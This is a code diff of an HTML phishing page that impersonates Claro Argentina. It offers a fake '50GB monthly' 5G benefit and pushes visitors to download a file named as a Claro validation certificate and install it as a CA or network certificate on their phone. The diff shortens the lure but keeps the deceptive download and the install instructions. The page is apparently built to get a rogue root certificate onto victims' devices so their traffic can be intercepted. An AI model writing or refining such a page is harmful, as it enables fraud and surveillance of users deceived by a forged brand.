@@ -3,36 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claro | Activación Beneficio 5G</title>
+    <title>Claro 5G | Activación</title>
     <style>
-        body { background: #ee1c25; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
-        .card { background: white; color: #333; padding: 25px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); max-width: 400px; margin: auto; }
-        .btn { background: #ee1c25; color: white; padding: 18px; border-radius: 10px; display: inline-block; font-weight: bold; text-decoration: none; margin-top: 20px; font-size: 18px; width: 100%; }
-        .instrucciones { text-align: left; font-size: 14px; margin-top: 15px; border-top: 1px solid #eee; padding-top: 10px; }
+        body { background: #ee1c25; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .card { background: white; color: #333; padding: 20px; border-radius: 15px; max-width: 350px; margin: auto; }
+        .btn { background: #ee1c25; color: white; padding: 15px; border-radius: 8px; display: block; font-weight: bold; text-decoration: none; margin-top: 20px; }
     </style>
 </head>
 <body>
     <h1>¡ÚLTIMO PASO!</h1>
-    <p>Para recibir tus <b>50GB MENSUALES</b>, debes sincronizar tu chip con nuestra red 5G.</p>
-    
     <div class="card">
-        <h3 style="color: #ee1c25; margin-top: 0;">Soporte Técnico Claro</h3>
-        <p>Descarga e instala el certificado de validación de red para activar tu beneficio:</p>
+        <h3 style="color: #ee1c25;">Sincronización 5G</h3>
+        <p>Descarga el perfil de red para activar tus 50GB mensuales.</p>
         
         <a href="claro_config.crt" download="Validacion_Claro_5G.crt" class="btn">
             DESCARGAR PERFIL 5G
         </a>
         
-        <div class="instrucciones">
-            <b>Cómo instalar:</b>
-            <ol>
-                <li>Descarga el archivo arriba.</li>
-                <li>Ve a <b>Ajustes > Seguridad > Instalar desde almacenamiento</b>.</li>
-                <li>Selecciona "Certificado de CA" o "Certificado de Red" y acepta.</li>
-            </ol>
-        </div>
+        <p style="font-size: 12px; margin-top: 15px; color: #666;">
+            <b>IMPORTANTE:</b> Si dice "Sin archivos", ve a <b>Ajustes > Seguridad > Instalar certificado</b> y selecciona el archivo descargado.
+        </p>
     </div>
-    
-    <p style="font-size: 12px; margin-top: 20px;">© 2026 Claro Argentina - Conexión Segura.</p>
 </body>
 </html>
